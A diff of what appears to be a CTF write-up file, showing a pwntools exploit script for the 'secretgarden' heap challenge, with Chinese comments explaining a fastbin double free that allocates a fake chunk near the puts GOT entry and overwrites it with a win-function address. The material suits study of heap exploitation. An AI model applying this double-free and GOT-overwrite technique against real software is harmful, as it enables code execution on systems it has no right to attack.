@@ -187,7 +187,6 @@ int main(){
 # -*- coding: utf-8 -*-
 from pwn import *
 
-
 r = process('./secretgarden')
 
 def raiseflower(length,name,color):
@@ -214,17 +213,23 @@ def clean():
     r.recvuntil(":")
     r.sendline("4")
 
-magic = 0x400c7b		#通过objdump -d ./secretgarden | less
-fake_chunk = 0x601ffa			#这个是错位的位置
-raiseflower(0x50,"da","red")
-raiseflower(0x50,"da","red")
-remove(0)
-remove(1)						# 这里就是构造了double free
-remove(0)
-raiseflower(0x50,p64(fake_chunk),"blue")	#放置错位的位置,让其之后可以申请到put_got附近
-raiseflower(0x50,"da","red")
-raiseflower(0x50,"da","red")
-raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red")	#申请到put_got附近,并修改之
 
-r.interactive()
+'''
+0x601ffa:	0x1e28000000000000	0xe150000000000060
+0x60200a:	0x195000007ffff7ff	0x079600007ffff7df
+
+'''
+if __name__ == '__main__':
+    magic = 0x400c7b
+    fake_chunk = 0x601ffa
+    puts_got = 0x602020
+    raiseflower(0x50,'aaaa','red')  #0
+    raiseflower(0x50,'aaaa','red')  #1
+    remove(1)
+    remove(0)
+    remove(1)
+    raiseflower(0x50, p64(0x601ffa), 'red')  #先申请的1
+    raiseflower(0x50, 'aaaa', 'red')  #再申请的0
+    raiseflower(0x50, 'aaaa', 'red')  #再申请的1
+    raiseflower(0x50,'a'*22+p64(magic) , 'red')  #这次申请到了put_got附近
 ```
